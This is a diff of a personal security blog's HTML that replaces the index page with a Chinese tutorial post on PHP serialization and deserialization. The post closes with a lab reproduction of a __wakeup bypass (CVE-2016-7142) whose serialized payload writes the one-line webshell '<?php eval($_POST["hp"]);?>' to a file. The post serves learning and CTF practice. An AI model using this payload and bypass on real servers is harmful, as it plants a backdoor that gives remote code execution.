@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>xiaomeiqiu&#39;s Studio</title>
+    <title>序列化与反序列化简单-晋级 · xiaomeiqiu&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -77,6 +77,8 @@
 
     <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
     <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
     
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
@@ -201,14 +203,23 @@
 </head>
 
     
-        <body class="home-body">
+        <body class="post-body">
     
     
-<header class="header index-header">
+<header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">xiaomeiqiu&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">序列化与反序列化简单-晋级</a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">xiaomeiqiu's Studio.</a>
 </header>
@@ -227,17 +238,17 @@ height:50vh;
     <!-- 主页  -->
     
     
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            xiaomeiqiu's Studio.
-            <!-- 文章页  -->
+            序列化与反序列化简单-晋级
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -245,12 +256,43 @@ height:50vh;
             <!-- 主页副标题  -->
             
             
-                Life is fantastic
-            
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.4k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/09/05</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -351,395 +393,185 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/30/XXE攻击/">
-            
-                <span>XXE攻击</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h1><p>现在越来越多主要的web程序被发现和报告存在XXE（XML外部实体攻击）漏洞，比如说facebook，paypal等等。举个例子，我们扫一眼这些网站最近奖励的漏洞，充分证实了前面的说法。尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应得的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="XXE">XXE</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/01/18/python-flaslk-web/">
-            
-                <span>Python-Flask-小项目</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="前言-："><a href="#前言-：" class="headerlink" title="[前言]："></a>[前言]：</h2><p>前些日子用python开发了一个简单的留言班，最后一个月学业繁忙忘了整理记录一波。今天整理温习一波，视频是参考b站上的大佬的，b站真是无所不能呀。<br>
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/01/18</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="FLASK">FLASK</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/21/python-inject/">
-            
-                <span>python-模板注入</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：最近突然有些疲惫，闲着我就去做一个小小开发，开发之后发现自己用的是jinj2。尝试一波sql注入，果然写好的框架不是这么好日的。接下来学习了下模板注入。
-[正文]：1.产生该漏洞的原因：程序猿设计问题让模板的变量可控。跟sql注入的原理差不多。程序员自己的疏忽！
-2.利用的条件：1.是利用jinja2，或者其他模板开发的。 2.模板中的部分变量，代码用户可控。
-3.常见的利用点：1.jinja2中的render_template_string，进行渲染字符串为模板的时候。示例代码如下：
-@app.errorhandler(404)
-def page_not_found(e):
-...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/21</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/14/python-flask-web-base/">
-            
-                <span>Python-flask-web基础</span>
-        </a>
-        <div class="abstract-content">
-            [Flask开发准备]：Python虚拟环境介绍与安装：因为python的版本更新的太快，flask的版本不兼容，一个虚拟环境对应一个falsk，就可以解决这个问题。
-
-安装虚拟环境：pip install virtualevn
-
-将虚拟环境安装到指定目录：virtualevn flask-evn
-
-激活flask ：进入安装的目录进入Scripts 输入active
-
-在虚拟环境中安装flask：pip install flask
-
-
-Pycharm的使用：创建一个新项目：选择刚才创建环境中的/bin/python.exe。也可以让pycharm自己创建一个flask虚拟环境
-第一个f...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/07/java-web/">
-            
-                <span>JAVA-WEB-开发</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：最近写java作业老师要检查，那不能白白的浪费时间记录下自己开发学习过程，最后做个能看的javaweb项目。前端的就随便找个框架填上算了。
-[正文]：1.SERVERLET1.1 SERVERLET简介:
-
-Serverlet是位于Web服务器内部的，服务端的，独立于平台和协议的java应用程序，可以生成动态的web。
-Servlet是一个可信赖的程序，不受java安全性的控制，拥有和普通java应用程序一样的权限。
-Servlet是CGI Script的一种替代技术，由于Servlet在性能、可移植性、代码重用等方面比CGI具有显著的优势，因此在未来的技术发展过程中，Serv...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/11/06/网鼎杯-fakebook/">
-            
-                <span>网鼎杯第一场web_write_up</span>
-        </a>
-        <div class="abstract-content">
-            [前言]:最前看了上海的比赛自闭了，准备最近好好复现下近些天比赛的题目。首先从网鼎杯第一场开始。
-[正文]：题目：FAKEBOOK 题目文件：链接：https://pan.baidu.com/s/1enihLDFa9JnLJ1eG_ZcK6Q 密码：j6hh 扫一扫出来个user.php.bak（原谅我字典没扫到）还有个flag.php，然后得到user.php的代码。得到的代码如下。目前用不到接着往下做
-1234567891011121314151617181920212223242526272829303132333435363738394041class UserInfo&#123...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/06</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/09/05/序列化/">
-            
-                <span>序列化与反序列化简单-晋级</span>
-        </a>
-        <div class="abstract-content">
-            序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : serialize() 反序列化:恢复原先被序列化的变量 函数: unserialize()
-&lt;?php
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>序列化:把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等  函数 : <strong>serialize()</strong> 反序列化:恢复原先被序列化的变量 函数: <strong>unserialize()</strong></p>
+<pre><code>&lt;?php
 class QRQ{
     public $data;
     private $pass;
     private $qrq=&quot;dasdasdas&quot;;
     public $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;SAAB&quot;);
-    public $age=array(&quot;Pet...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/05</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
+    public $age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;);
+    public function __construct($data, $pass)
+    {
+        $this-&gt;data = $data;
+        $this-&gt;pass = $pass;
+    }
+}
+$number = 34;
+$str = &apos;uusama&apos;;
+$bool = true;
+$null = NULL;
+$arr = array(&apos;a&apos; =&gt; 1, &apos;b&apos; =&gt; 2);
+$ccbbb = new QRQ(&apos;uu&apos;,&quot;admin&quot;);
+var_dump(serialize($number));
+var_dump(serialize($str));
+var_dump(serialize($bool));
+var_dump(serialize($null));
+var_dump(serialize($arr));
+var_dump(serialize($ccbbb));
+
+?&gt;
+</code></pre><p>得到的结果如下：</p>
+<pre><code>D:\phpStudy\WWW\linshi\xuliehua.php:20:string &apos;i:34;&apos; (length=5)
+D:\phpStudy\WWW\linshi\xuliehua.php:21:string &apos;s:6:&quot;uusama&quot;;&apos; (length=13)
+D:\phpStudy\WWW\linshi\xuliehua.php:22:string &apos;b:1;&apos; (length=4)
+D:\phpStudy\WWW\linshi\xuliehua.php:23:string &apos;N;&apos; (length=2)
+D:\phpStudy\WWW\linshi\xuliehua.php:24:string &apos;a:2:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;}&apos; (length=30)
+D:\phpStudy\WWW\linshi\xuliehua.php:25:string &apos;O:3:&quot;QRQ&quot;:5:{s:4:&quot;data&quot;;s:2:&quot;uu&quot;;s:9:&quot;�QRQ�pass&quot;;s:5:&quot;admin&quot;;s:8:&quot;�QRQ�qrq&quot;;s:9:&quot;dasdasdas&quot;;s:4:&quot;cars&quot;;a:3:{i:0;s:5:&quot;Volvo&quot;;i:1;s:3:&quot;BMW&quot;;i:2;s:4:&quot;SAAB&quot;;}s:8:&quot;�QRQ�age&quot;;a:3:{s:5:&quot;Peter&quot;;s:2:&quot;35&quot;;s:3:&quot;Ben&quot;;s:2:&quot;37&quot;;s:3:&quot;Joe&quot;;s:2:&quot;43&quot;;}}&apos; (length=235)
+</code></pre><p>可以发现在序列化私有成员变量的时候，会莫名奇妙的加上类名以及2个字符长度（序列化时生成的序列化字符串中类名前后本来就会有0×00，url编码下为<code>%00</code>。可以<code>echo(serialize($o))</code>查看。前面举的例子之所以没用%00是因为成员属性为private）。其他的都没问题。 当序列化的对象有继承时，常量的值不会被序列化，变量的值会被序列化。</p>
+<pre><code>&lt;?php
+class CB {
+    public $CB_data = &apos;cb&apos;;
+    private $bb=&quot;1321&quot;;
+}
+
+class CC extends CB{
+    const SECOND = 60;
+
+    public $data;
+    private $pass;
+
+    public function __construct($data, $pass)
+    {
+        $this-&gt;data = $data;
+        $this-&gt;pass = $pass;
+    }
+
+    public function setPass($pass)
+    {
+        $this-&gt;pass = $pass;
+    }
+}
+$cc = new CC(&apos;uu&apos;, true);
+
+var_dump(serialize($cc));
+
+?&gt;
+</code></pre><p>得到的结果</p>
+<p>D:\phpStudy\WWW\linshi\xuliehua.php:26:string ‘O:2:”CC”:4:{s:4:”data”;s:2:”uu”;s:8:”�CC�pass”;b:1;s:7:”CB_data”;s:2:”cb”;s:6:”�CB�bb”;s:4:”1321”;}’ <em>(length=99)</em></p>
+<p>另外在调用serialize()函数时，会先检查是否存在魔术方法__sleep(),如果存在先执行该方法，然后序列化。并且不能返回父类私有成员的名字。</p>
+<pre><code>class User{
+    const SITE = &apos;uusama&apos;;
+
+    public $username;
+    public $nickname;
+    private $password;
+
+    public function __construct($username, $nickname, $password)
+    {
+        $this-&gt;username = $username;
+        $this-&gt;nickname = $nickname;
+        $this-&gt;password = $password;
+    }
+
+    // 重载序列化调用的方法
+    public function __sleep()
+    {
+        // 返回需要序列化的变量名，过滤掉password变量
+        return array(&apos;username&apos;, &apos;nickname&apos;);
+    }
+}
+$user = new User(&apos;uusama&apos;, &apos;uu&apos;, &apos;123456&apos;);
+var_dump(serialize($user));
+</code></pre><p>返回结果如下，显然序列化的时候忽略了 password 字段的值</p>
+<pre><code>string(67) &quot;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&quot;
+</code></pre><h2 id="总结-："><a href="#总结-：" class="headerlink" title="[总结]："></a>[总结]：</h2><p>序列化对象 O表示对象，5,表示类名的长度，hello表示类的名称，1表示非静态成员函数的个数。s表示字符串，i表示数字，5表示长度，test4表示变量名。 序列化数组，a表示数组，2表示数据个数，i表示数字</p>
+<h2 id="晋级版"><a href="#晋级版" class="headerlink" title="[晋级版]"></a><strong>[晋级版]</strong></h2><p>本部分参考安全客<a href="https://www.anquanke.com/post/id/159206#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206#h3-5</a></p>
+<h3 id="1-绕过魔法函数的反序列化漏洞"><a href="#1-绕过魔法函数的反序列化漏洞" class="headerlink" title="1.绕过魔法函数的反序列化漏洞"></a>1.绕过魔法函数的反序列化漏洞</h3><p>漏洞编号：CVE-2016-7142 威胁版本：PHP5 &lt; 5.6.25/PHP7 &lt; 7.0.10 利用方式：魔法函数__wakeup()：在进行unserialize()时，会自动调用类中的__wakeup()函数，当进行反序列化操作时，如果反序列化的属性大于类中的属性，_wake_up()函数将不会被调用。 漏洞复现： 测试代码如下：</p>
+<pre><code>&lt;?php
+/**
+ * 
+ */
+
+class A
+{
+    var $a=&quot;test&quot;;
+    function __destruct()
+    {
+
+        $fp = fopen(&quot;D:\\phpStudy\\WWW\\123.php&quot;, &quot;w&quot;);
+        fwrite($fp,$this-&gt;a);
+        fclose($fp);
+        echo &quot;I am __destruct   &quot;;
+    }
+
+    function __wakeup()
+    {
+        foreach (get_object_vars($this) as $k =&gt; $v) {
+            $this-&gt;$k = null;
+            echo &quot;I am __wakeup   &quot;;
+        }
+    }
+}
+$b=&apos;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:27:&quot;&lt;?php eval($_POST[&quot;hp&quot;]);?&gt;&quot;;}&apos;;
+$clan = unserialize($b);
+?&gt;
+</code></pre><p>测试结果：</p>
+<pre><code>I am __wakeup   I am __destruct
+</code></pre><p>当$b=’O:1:”A”:2:{s:1:”a”;s:27:”&lt;?php eval($_POST[“hp”]);?&gt;”;}’是测试结果如下：</p>
+<pre><code>I am __destruct   [Finished in 0.1s]
+</code></pre><p><strong>序列化漏洞常见的魔法函数</strong></p>
+<p>construct():当一个类被创建时自动调用 destruct():当一个类被销毁时自动调用 invoke():当把一个类当作函数使用时自动调用 tostring():当把一个类当作字符串使用时自动调用 wakeup():当调用unserialize()函数时自动调用 sleep():当调用serialize()函数时自动调用 __call():当要调用的方法不存在或权限不足时自动调用</p>
+<h3 id="2-Session反序列化漏洞"><a href="#2-Session反序列化漏洞" class="headerlink" title="2.Session反序列化漏洞"></a>2.Session反序列化漏洞</h3><p>漏洞的原理在安全客上，大佬就是大佬。这里只说下我自己的理解，在session序列化操作中当session_start()被调用或者php.ini中session.auto_start为1时，php将session序列化，能够用两种方式序列化一种是php_serialize，另一种是php，形式，两种方式序列化的结果不同，若服务端和客户端写的序列化和反序列化的方式不同，则可能造成序列化的类，字符串，数组数据被篡改。 漏洞复现在安全客上说的很详细。 安全客连接：<a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/08/13/little-muma/">
-            
-                <span>ISCC国赛-一句话木马分析</span>
-        </a>
-        <div class="abstract-content">
-            [前言]：北京iscc回来之后还没来得及时总结，比赛结果还是不错的国赛二等奖可以吹会了。但是更多的是收获，这次比赛发现web狗真是没法活下去了，比赛的web难的一批。除了第一个web我们做出来了，其他的我竟然都没扫描出来有高端口。。好像是6千几来着，回头复现下那个环境。第一个做出来也是千辛万苦呀，还是太菜，web狗表示打不动。应该有好多人看到一句话木马都没打动。真是这越来越难了，pwn大佬就是6上来干俩pwn虐爆全场，就在我们后面（每次好像都是），大佬在身后，萌新瑟瑟发抖。刚开始刷分的时候，基本上没几个得分的。本来想删他们的一句话木马，但是由于自己技术不熟练没种上，急于开心的刷flag没...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="23.105.208.131">xiaomeiqiu</a>
+            </p><p>原文链接：<a href="23.105.208.131/2018/09/05/序列化/">23.105.208.131/2018/09/05/序列化/</a>
+            </p><p>发表日期：<a href="23.105.208.131/2018/09/05/序列化/">九月 5日 2018, 10:38:46 晚上</a>
+            </p><p>更新日期：<a href="23.105.208.131/2018/09/05/序列化/">January 29th 2019, 4:56:04 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/13</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="php单双引号">php单双引号</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="木马">木马</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/06/10/2018西普杯铁人三项河南赛区（数据分析赛）/">
-            
-                <span>2018西普杯铁人三项河南赛区（数据分析赛）</span>
-        </a>
-        <div class="abstract-content">
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说下踩坑经历。第一次参加这种综合性比赛、数据赛、个人赛（主要是pwn）、企业赛，看到pwn没办法我们只能对他说再见（从头到尾连看都没看）。看似是一道文件上传题，n种姿势上传都失败，查看上传的文件发现什~$msf.doc、~$office.doc、……
-        </p></div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/06/10</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="流量分析">流量分析</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2018/04/08/SQL注入-Oderby注入/">
-            
-                <span>SQL注入-order by 注入</span>
-        </a>
-        <div class="abstract-content">
-            ##SQL注入-ORDERBY注入
-1，后台登录代码如下：123456789101112131415161718$username = $_POST['username'];$password = $_POST['password'];if(filter($username))&#123;    //过滤括号&#125;else&#123;    $sql="SELECT * FROM admin WHERE username='".$username."'";    $result=mysql_query($sql);    @$row = mysql_fetch_array($res...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/04/08</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
-    
-</main>
-            <!-- profile -->
+    <ul class="post-paginator">
+        <li class="next">
             
-            <div class="profile">
-    <img class="profile-avatar" alt="avatar" src="https://raw.githubusercontent.com/xiaomeiqiu007/warm-photos/master/timg.jpg">
-    <div class="profile-name">xiaomeiqiu</div>
-    
-    <div class="profile-signature">
-        witness me
-    </div>
-    
-    
-    <div class="profile-social">
-        
-    
-        
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/11/06/网鼎杯-fakebook/" title="网鼎杯第一场web_write_up">
+                    <div class="nextTitle">网鼎杯第一场web_write_up</div>
+                </a>
             
-                <a href="mailto:1870977163@qq.com" class="iconfont-archer email" title="email"></a>
+        </li>
+        <li class="previous">
             
-        
-    
-        
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/08/13/little-muma/" title="ISCC国赛-一句话木马分析">
+                    <div class="prevTitle">ISCC国赛-一句话木马分析</div>
+                </a>
             
-                <a href="//github.com/xiaomeiqiu007" class="iconfont-archer github" target="_blank" title="github"></a>
-            
-        
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-        
     
-        
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
     
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
     
 
-    </div>
-    
-    
-        <div class="friends">
-            <div>FRIENDS</div>
-            
-                
-                    <span>
-                        <a href="//www.lybsec.top" target="_black">friendA</a>
-                    </span>
-                
-            
-                
-                    <span>
-                        <a href="//www.77sec.cn" target="_black">friendB</a>
-                    </span>
-                
-            
-                
-            
-        </div>
-    
-    
-        <div class="about-me">
-            <a href="/about">ABOUT ME</a>
-        </div>
-    
-</div>
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
             
         </div>
         <footer class="footer footer-unloaded">
@@ -815,6 +647,24 @@ class QRQ{
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#总结-："><span class="toc-number">1.</span> <span class="toc-text">[总结]：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#晋级版"><span class="toc-number">2.</span> <span class="toc-text">[晋级版]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-绕过魔法函数的反序列化漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">1.绕过魔法函数的反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Session反序列化漏洞"><span class="toc-number">2.2.</span> <span class="toc-text">2.Session反序列化漏洞</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1111,6 +961,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
